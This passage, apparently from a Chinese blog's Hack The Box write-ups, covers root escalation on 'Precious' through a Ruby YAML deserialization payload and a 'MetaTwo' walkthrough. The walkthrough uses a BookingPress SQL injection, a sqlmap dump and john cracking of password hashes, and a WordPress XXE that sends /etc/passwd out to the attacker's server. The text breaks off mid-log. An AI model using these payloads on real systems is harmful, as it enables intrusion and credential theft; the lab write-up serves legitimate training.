fingerprint is SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.189' (ED25519) to the list of known hosts.\nhenry@10.10.11.189's password: \nLinux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sat Dec 31 18:20:32 2022 from 10.10.14.78\nhenry@precious:~$ whoami&&id\nhenry\nuid=1000(henry) gid=1000(henry) groups=1000(henry)\n```\n成功拿到 user 权限\n\n```bash\nhenry@precious:~$ cat user.txt \n415eb4be868d88438bda7f02ce8528f1\n```\n成功拿到 user 权限的 flag 文件\n\n## Root\n```bash\nhenry@precious:~$ sudo -l\nMatching Defaults entries for henry on precious:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser henry may run the following commands on precious:\n    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb\n```\n我们可以使用 root 权限利用 ruby 执行 /opt/update\\_dependencies.rb\n\n```ruby\nhenry@precious:~$ cat /opt/update_dependencies.rb\n# Compare installed dependencies with those specified in \"dependencies.yml\"\nrequire \"yaml\"\nrequire 'rubygems'\n\n# TODO: update versions automatically\ndef update_gems()\nend\n\ndef list_from_file\n    YAML.load(File.read(\"dependencies.yml\"))\nend\n\ndef list_local_gems\n    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}\nend\n\ngems_file = list_from_file\ngems_local = list_local_gems\n\ngems_file.each do |file_name, file_version|\n    gems_local.each do |local_name, local_version|\n        if(file_name == local_name)\n            if(file_version != local_version)\n                puts \"Installed version differs from the one specified in file: \" + local_name\n            else\n                puts \"Installed version is equals to the one specified in file: \" + local_name\n            end\n        end\n    end\nend\n```\n这里看到，这里使用了容易受到反序列化攻击的 YAML\n\n> [https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)\n\n这里找到了一份参考文档\n\n```bash\n---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &1 !ruby/object:Net::BufferedIO\n      io: &1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: \"abc\"\n      debug_output: &1 !ruby/object:Net::WriteAdapter\n         socket: &1 !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module 'Kernel'\n                 method_id: :system\n             git_set: id\n         method_id: :resolve\n```\n将上面的内容保存为 dependencies.yml\n\n然后去运行\n\n```bash\nhenry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb\nsh: 1: reading: not found\nuid=0(root) gid=0(root) groups=0(root)\nTraceback (most recent call last):\n        33: from /opt/update_dependencies.rb:17:in `<main>'\n        32: from /opt/update_dependencies.rb:10:in `list_from_file'\n        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'\n        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'\n        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'\n        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'\n        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'\n        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'\n        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'\n        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'\n        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'\n        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'\n        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'\n        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'\n        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'\n        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'\n        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'\n        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'\n        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'\n        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'\n        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'\n        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'\n        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'\n        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'\n         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'\n         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'\n         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'\n         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'\n         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'\n         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'\n         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'\n         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'\n         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'\n/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)\n```\n执行成功了，然后我们修改一下代码\n\n```bash\n---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &1 !ruby/object:Net::BufferedIO\n      io: &1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: \"abc\"\n      debug_output: &1 !ruby/object:Net::WriteAdapter\n         socket: &1 !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module 'Kernel'\n                 method_id: :system\n             git_set: chmod +s /bin/bash\n         method_id: :resolve\n\n```\n```bash\nhenry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb\nsh: 1: reading: not found\nTraceback (most recent call last):\n        33: from /opt/update_dependencies.rb:17:in `<main>'\n        32: from /opt/update_dependencies.rb:10:in `list_from_file'\n        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'\n        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'\n        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'\n        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'\n        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'\n        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'\n        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'\n        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'\n        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'\n        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'\n        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'\n        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'\n        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'\n        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'\n        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'\n        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'\n        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'\n        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'\n        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'\n        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'\n        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'\n        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'\n         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'\n         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'\n         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'\n         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'\n         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'\n         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'\n         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'\n         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'\n         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'\n/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)\nhenry@precious:~$ ls -la /bin/bash\n-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash\n```\nok，执行成功，现在去完成提权吧\n\n```bash\nhenry@precious:~$ /bin/bash -p\nbash-5.1# whoami&&id\nroot\nuid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)\n```\n成功提权到 root 用户\n\n```bash\nbash-5.1# cat /root/root.txt\na8ac857576f35e2c14a259a4e77bfe55\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"MetaTwo - Hackthebox","url":"/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/","content":"\n# Hackthebox - MetaTwo\n# 靶场信息\n![image](Hackthebox-MetaTwo/uR6cU3c1jgvI8p_TtboYiEPlmfFY_p4qdXdZmmDLjKY.png)\n\n# 靶场类型\n![image](Hackthebox-MetaTwo/EovdXT77sIyt_X7TJipFrHeG_6QnDkkhZKKjLqhF3D0.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.186\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 01:52 EST\nWarning: 10.10.11.186 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.11.186\nHost is up (0.44s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp\n| fingerprint-strings: \n|   GenericLines: \n|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]\n|     Invalid command: try being more creative\n|_    Invalid command: try being more creative\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)\n|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)\n|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)\n80/tcp open  http    nginx 1.18.0\n|_http-title: Did not follow redirect to http://metapress.htb/\n|_http-server-header: nginx/1.18.0\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port21-TCP:V=7.93%I=7%D=12/23%Time=63A55072%P=x86_64-pc-linux-gnu%r(Gen\nSF:ericLines,8F,\"220\\x20ProFTPD\\x20Server\\x20\\(Debian\\)\\x20\\[::ffff:10\\.10\nSF:\\.11\\.186\\]\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20cr\nSF:eative\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20creativ\nSF:e\\r\\n\");\nAggressive OS guesses: Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 4.15 - 5.6 (94%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 - 3.10 (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT       ADDRESS\n1   408.01 ms 10.10.16.1\n2   648.09 ms 10.10.11.186\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 148.71 seconds\n```\n首先加入一个 hosts 解析\n\n```bash\necho 10.10.11.186 metapress.htb >> /etc/hosts\n```\n## Http\n![image](Hackthebox-MetaTwo/9nAAPY7TMRDXl3dWSXViz1hRbAdzvJqAMJem_Zmsyl0.png)\n\n是我翻译器不对吗，这里首页翻译出来意思是欢迎登记？我不是很明白是什么意思，这里给出了两个信息，有一个 /events/ 目录，以及该页面是用 wordpress 搭建的。我们到处做一下信息收集\n\n## Wpscan\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# wpscan --url \"http://metapress.htb/\" --enumerate vt vp\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.22\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://metapress.htb/ [10.10.11.186]\n[+] Started: Fri Dec 23 02:23:08 2022\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entries:\n |  - Server: nginx/1.18.0\n |  - X-Powered-By: PHP/8.0.24\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] robots.txt found: http://metapress.htb/robots.txt\n | Interesting Entries:\n |  - /wp-admin/\n |  - /wp-admin/admin-ajax.php\n | Found By: Robots Txt (Aggressive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://metapress.htb/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).\n | Found By: Rss Generator (Passive Detection)\n |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>\n |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>\n\n[+] WordPress theme in use: twentytwentyone\n | Location: http://metapress.htb/wp-content/themes/twentytwentyone/\n | Last Updated: 2022-11-02T00:00:00.000Z\n | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt\n | [!] The version is out of date, the latest version is 1.7\n | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1\n | Style Name: Twenty Twenty-One\n | Style URI: https://wordpress.org/themes/twentytwentyone/\n | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n | Confirmed By: Css Style In 404 Page (Passive Detection)\n |\n | Version: 1.1 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'\n\n[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)\n Checking Known Locations - Time: 00:00:31 <===================================================================================================================================> (482 / 482) 100.00% Time: 00:00:31\n[+] Checking Theme Versions (via Passive and Aggressive Methods)\n\n[i] No themes Found.\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Fri Dec 23 02:23:51 2022\n[+] Requests Done: 509\n[+] Cached Requests: 14\n[+] Data Sent: 154.463 KB\n[+] Data Received: 518.845 KB\n[+] Memory used: 186.137 MB\n[+] Elapsed time: 00:00:43\n```\n这里确定了 wordpress 的版本为 5.6.2，然后发现了两个页面\n\n```bash\n/wp-admin/\n/wp-admin/admin-ajax.php\n```\n# 漏洞利用\n我们在第二个页面中发现了一个插件 bookingpress 1.0.10\n\n![image](Hackthebox-MetaTwo/nO4dQvMqb5e2Pc5-oz9Hb_5wJWDk3TApcQIfH8HOwYI.png)\n\n> [https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)\n\n发现了一个漏洞，似乎是允许我们进行注入的漏洞漏洞\n\n对于这项漏洞的利用，我们需要一些信息，我们可以在 /wp-admin/admin-ajax.php 中找到\n\n![image](Hackthebox-MetaTwo/hotp2ayPMJjZ1Ew2f8YaAlRpLvuPG5RNNHuB42Qejok.png)\n\n\n\n```bash\n_wpnonce = b0a6dfdddb\n```\n然后我们就可以构造 poc 了\n\n```bash\ncurl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=b0a6dfdddb&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080\n```\n然后使用 curl 的 -x 参数将包发送到 burp 中\n\n![image](Hackthebox-MetaTwo/9PFSpyMIeZT43lK1tBcABBBQFTI3T7yGGTEMXh4ZDRo.png)\n\n![image](Hackthebox-MetaTwo/yT76Ix0j2yfaIrCA7VSSXE5ytJP8Pf7qNlAfwE-ZjuI.png)\n\n然后使用 copytofile 将其保存为 admin.req\n\n```bash\nPOST /wp-admin/admin-ajax.php HTTP/1.1\nHost: metapress.htb\nUser-Agent: curl/7.85.0\nAccept: */*\nContent-Length: 185\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\naction=bookingpress_front_get_category_services&_wpnonce=b0a6dfdddb&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -\n```\n这是我们保存下来的文件，我们需要稍微修改一下，将 total\\_service 后面的参数改为 1\n\n```bash\nPOST /wp-admin/admin-ajax.php HTTP/1.1\nHost: metapress.htb\nUser-Agent: curl/7.85.0\nAccept: */*\nContent-Length: 185\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\naction=bookingpress_front_get_category_services&_wpnonce=b0a6dfdddb&category_id=33&total_service=1\n```\n这是我们修改好的文件，然后丢进 sqlmap 跑就行了\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# sqlmap -r admin.req -p total_service --batch -D blog -T wp_users --dump\n\n+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+\n| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |\n+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+\n| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |\n| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |\n+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+\n```\n然后把 user\\_pass 的 hash 丢进 john 里跑一下\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])\nCost 1 (iteration count) is 8192 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\npartylikearockstar (?)     \n1g 0:00:10:20 DONE (2022-12-23 03:03) 0.001610g/s 23102p/s 23280c/s 23280C/s  joefeher..*7¡Vamos!\nUse the \"--show --format=phpass\" options to display all of the cracked passwords reliably\nSession completed.\n```\n这里跑出来了一个密码 partylikearockstar\n\n使用这个密码去 [http://metapress.htb/wp-admin/](http://metapress.htb/wp-admin/) 进行登陆\n\n```bash\nusername = manager\npassword = partylikearockstar\n```\n> [https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5)\n\n> [https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/)\n\n经过版本搜索，找到了一个 5.6.2 存在的 XXE漏洞\n\n这个漏洞的大致解释就是，WordPress 的作者（可编辑者）可以将媒体文件上传到 WordPress 媒体库，以便在帖子中使用它。上传 WAVE 音频文件后，WordPress 函数会从包含恶意 XML 外部实体的变量中包含 `wp_read_audio_metadata()` 的 iXML 元数据中提取音频信息。\n\n```bash\necho -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00<?xml version=\"1.0\"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '\"'\"'http://10.10.14.84:9000/evil.dtd'\"'\"'>%remote;%init;%trick;]>\\x00' > payload.wav\n```\n修改好我们的 payload，然后生成一个 payload\n\n然后在 evil.dtd 中，放入我们的恶意 XML 代码\n\n```bash\n<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\" >\n<!ENTITY % init \"<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.84:9000/?p=%file;'>\">\n```\n接着使用 PHP 开启一个 http 服务器\n\n```bash\nphp -S 0.0.0.0:9000\n```\n接着我们点击左侧仪表盘的 Media -> Library 并上传我们的 payload.wav\n\n![image](Hackthebox-MetaTwo/cRE-S9q01Pn_cr4X18m_UTTZ3B5IXisa6P_xyiMnF_Y.png)\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# php -S 0.0.0.0:9000\n[Sat Dec 31 13:35:59 2022] PHP 8.1.12 Development Server (http://0.0.0.0:9000) started\n[Sat Dec 31 13:36:05 2022] 10.10.11.186:57332 Accepted\n[Sat Dec 31 13:36:05 2022] 10.10.11.186:57332 [200]: GET /evil.dtd\n[Sat Dec 31 13:36:05 2022] 10.10.11.186:57332 Closing\n[Sat Dec 31 13:36:06 2022] 10.10.11.186:57342 Accepted\n[Sat Dec 31 13:36:06 2022] 10.10.11.186:57342 [404]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= - No such file or directory\n[Sat Dec 31 13:36:06 2022] 10.10.11.186:57342 Closing\n[Sat Dec 31 13:36:06 2022] 10.10.11.186:57350 Accepted\n[Sat Dec 31 13:36:06 2022] 10.10.11.186:57350 [200]: GET /evil.dtd\n[Sat Dec 31 13:36:06 2022] 10.10.11.186:57350 Closing\n[Sat Dec 31 13:36:07 2022] 10.10.11.186:57360 Accepted\n[Sat Dec 31 13:36:07 2022] 10.10.11.186:57360 [404]: GET 